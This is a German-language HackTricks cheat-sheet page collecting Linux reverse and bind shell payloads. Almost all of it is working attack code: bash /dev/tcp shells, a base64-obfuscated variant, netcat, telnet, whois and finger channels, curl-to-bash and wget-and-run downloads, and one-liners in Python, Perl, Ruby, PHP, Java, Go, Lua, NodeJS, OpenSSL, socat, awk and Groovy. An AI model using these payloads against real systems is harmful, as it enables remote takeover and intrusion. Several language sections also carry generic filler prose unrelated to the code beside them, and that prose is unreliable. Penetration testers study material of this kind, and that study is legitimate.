# Shells - Linux

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.

</details>

**Wenn Sie Fragen zu einer dieser Shells haben, können Sie sie mit** [**https://explainshell.com/**](https://explainshell.com) **überprüfen**

## Full TTY

**Sobald Sie eine Reverse-Shell erhalten haben**[ **lesen Sie diese Seite, um ein vollständiges TTY zu erhalten**](full-ttys.md)**.**

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
### Symbol sicherer Shell

Vergessen Sie nicht, auch mit anderen Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell Erklärung

1. **`bash -i`**: Dieser Teil des Befehls startet eine interaktive (`-i`) Bash-Shell.
2. **`>&`**: Dieser Teil des Befehls ist eine Kurzschreibweise für die **Umleitung sowohl des Standardausgangs** (`stdout`) als auch des **Standardfehlers** (`stderr`) zum **gleichen Ziel**.
3. **`/dev/tcp/<ANGREIFER-IP>/<PORT>`**: Dies ist eine spezielle Datei, die eine TCP-Verbindung zur angegebenen IP-Adresse und Port darstellt.
* Durch **Umleiten der Ausgabe- und Fehlerströme in diese Datei** sendet der Befehl effektiv die Ausgabe der interaktiven Shell-Sitzung an den Rechner des Angreifers.
4. **`0>&1`**: Dieser Teil des Befehls **leitet die Standardeingabe (`stdin`) zum gleichen Ziel wie die Standardausgabe (`stdout`)** um.

### In Datei erstellen und ausführen
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Vorwärtsschale

Wenn Sie eine **RCE-Schwachstelle** in einer auf Linux basierenden Webanwendung finden, kann es Situationen geben, in denen das **Erhalten einer umgekehrten Shell schwierig wird**, aufgrund von Iptables-Regeln oder anderen Filtern. In solchen Szenarien sollten Sie in Betracht ziehen, eine PTY-Shell innerhalb des kompromittierten Systems mithilfe von Pipes zu erstellen.

Sie finden den Code unter [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell)

Sie müssen lediglich Folgendes anpassen:

* Die URL des verwundbaren Hosts
* Das Präfix und Suffix Ihres Payloads (falls vorhanden)
* Die Art und Weise, wie der Payload gesendet wird (Header? Daten? Zusätzliche Informationen?)

Dann können Sie einfach **Befehle senden** oder sogar den Befehl `upgrade` verwenden, um eine vollständige PTY zu erhalten (beachten Sie, dass Pipes mit einer ungefähren Verzögerung von 1,3 Sekunden gelesen und geschrieben werden).

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## gsocket

Überprüfen Sie es unter [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/)
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet

Telnet ist ein Netzwerkprotokoll, das die Möglichkeit bietet, eine Verbindung zu einem entfernten System herzustellen und eine interaktive Shell-Sitzung zu starten. Es wird häufig von Hackern verwendet, um Schwachstellen zu identifizieren und Systeme zu kompromittieren.
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Angreifer**
```bash
while true; do nc -l <port>; done
```
Um den Befehl zu senden, schreiben Sie ihn auf, drücken Sie Enter und drücken Sie dann STRG+D (um STDIN zu stoppen)

**Opfer**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python

### Python Reverse Shell

Eine einfache Möglichkeit, eine Reverse-Shell in Python zu erstellen, ist die Verwendung des folgenden Codes:

```python
import socket
import subprocess

HOST = '127.0.0.1'  # Der Ziel-IP-Adresse
PORT = 4444         # Der Ziel-Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

while True:
    command = s.recv(1024).decode()
    if 'exit' in command:
        break
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    s.send(output.stdout.read())
    s.send(output.stderr.read())

s.close()
```
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl

Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben. Perl bietet leistungsstarke Funktionen für die Verarbeitung von Textdateien und kann auch für die Netzwerkprogrammierung verwendet werden. Es ist auf den meisten Linux-Systemen vorinstalliert und bietet eine Vielzahl von Modulen, die für verschiedene Hacking-Aufgaben nützlich sind.
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby

### Ruby-Shell

Ruby-Shell ist ein interaktiver Ruby-Interpreter, der es Ihnen ermöglicht, Ruby-Code direkt von der Shell auszuführen. Sie können Ruby-Shell starten, indem Sie einfach `irb` in Ihrer Shell eingeben. Dies öffnet eine Ruby-Shell-Sitzung, in der Sie Ruby-Code eingeben und sofort die Ergebnisse sehen können.

### Ruby-Skripte

Sie können auch Ruby-Skripte von der Shell aus ausführen, indem Sie den Befehl `ruby` gefolgt von dem Pfad zur Ruby-Datei eingeben. Zum Beispiel: `ruby mein_skript.rb`. Dadurch wird das Ruby-Skript ausgeführt und die Ausgabe wird in Ihrer Shell angezeigt.

### Ruby-Gems

RubyGems ist ein Paketmanager für Ruby, mit dem Sie Ruby-Bibliotheken und -Programme installieren und verwalten können. Sie können RubyGems von der Shell aus mit dem Befehl `gem` verwenden. Einige nützliche Befehle sind `gem install`, um ein RubyGem zu installieren, `gem list`, um installierte Gems anzuzeigen, und `gem uninstall`, um ein RubyGem zu deinstallieren.

### Ruby-Dokumentation

Sie können die Ruby-Dokumentation auch direkt von der Shell aus aufrufen, indem Sie den Befehl `ri` gefolgt von dem Ruby-Konstrukt eingeben, zu dem Sie Informationen benötigen. Zum Beispiel: `ri Array`. Dadurch wird die Dokumentation für das Array-Konstrukt in Ruby angezeigt.
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP

PHP ist eine serverseitige Skriptsprache, die hauptsächlich für die Webentwicklung verwendet wird. Es bietet die Möglichkeit, dynamische Webseiten zu erstellen und mit Datenbanken zu interagieren. PHP-Skripte werden auf dem Server ausgeführt und das Ergebnis wird an den Client gesendet, was es zu einer beliebten Wahl für die Entwicklung von Webanwendungen macht.
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java

Java ist eine objektorientierte Programmiersprache, die auf der Java Virtual Machine (JVM) läuft. Java-Programme werden in Bytecode kompiliert, der von der JVM ausgeführt wird. Java wird häufig für die Entwicklung von Anwendungen, Webanwendungen und mobilen Anwendungen verwendet. Es ist auch eine der beliebtesten Sprachen für die Entwicklung von Android-Apps.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat

Ncat ist ein vielseitiges Netzwerk-Tool, das Funktionen wie Port-Scanning, Datenübertragung und Port-Weiterleitung bietet. Es kann auch als Ersatz für Netcat verwendet werden und verfügt über zusätzliche Funktionen wie SSL-Unterstützung und Verbindungsdurchsetzung.
```bash
victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
attacker> ncat -v 10.0.0.22 4444 --ssl
```
## Golang

### Beschreibung

Golang ist eine Open-Source-Programmiersprache, die von Google entwickelt wurde. Sie wurde entwickelt, um effiziente Software zu erstellen und ist besonders gut für die Entwicklung von Netzwerkanwendungen und Tools geeignet. Golang bietet eine starke Standardbibliothek, die viele Funktionen für die Entwicklung von Anwendungen enthält.

### Verwendung

Golang wird häufig für die Entwicklung von Tools und Skripten verwendet, die in der Informationssicherheitsbranche eingesetzt werden. Es wird auch für die Entwicklung von Webanwendungen und Cloud-Diensten verwendet. Golang bietet eine einfache Syntax und eine gute Leistung, was es zu einer beliebten Wahl für Entwickler macht.
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua

Lua ist eine leistungsstarke, effiziente, leichtgewichtige und eingebettete Skriptsprache. Lua wird häufig für die Erweiterung von Anwendungen und die Automatisierung von Aufgaben verwendet. Lua bietet eine einfache Syntax und ist einfach zu erlernen. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden, einschließlich der Shell. Lua bietet auch die Möglichkeit, C-Funktionen aufzurufen und C-Datentypen zu definieren. Lua kann in verschiedenen Betriebssystemen und Plattformen verwendet werden.
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## OpenSSL

Der Angreifer (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
```
Das Opfer
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Umgekehrte Shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk ist eine leistungsstarke Skriptsprache und ein Befehlszeilen-Tool, das häufig zum Analysieren und Verarbeiten von Textdateien in Unix- und Linux-Umgebungen verwendet wird. Es ermöglicht Benutzern, Daten zu extrahieren, Muster zu suchen und bestimmte Aktionen basierend auf definierten Regeln auszuführen. Awk kann auch in Shell-Skripten verwendet werden, um komplexe Aufgaben zu automatisieren und zu vereinfachen.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Angreifer**
```bash
while true; do nc -l 79; done
```
Um den Befehl zu senden, schreiben Sie ihn auf, drücken Sie Enter und drücken Sie dann STRG+D (um STDIN zu stoppen)

**Opfer**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk ist eine leistungsstarke Skriptsprache für die Datenverarbeitung und Textmanipulation in Unix- und Linux-Umgebungen. Es wird häufig von Hackern verwendet, um Daten zu analysieren und Skripte für verschiedene Zwecke zu erstellen.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Dies wird versuchen, eine Verbindung zu Ihrem System über den Port 6001 herzustellen:
```bash
xterm -display 10.0.0.1:1
```
Um die umgekehrte Shell zu erhalten, können Sie Folgendes verwenden (die auf Port 6001 lauscht):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

von [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) HINWEIS: Java-Reverse-Shell funktioniert auch für Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Referenzen

* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>
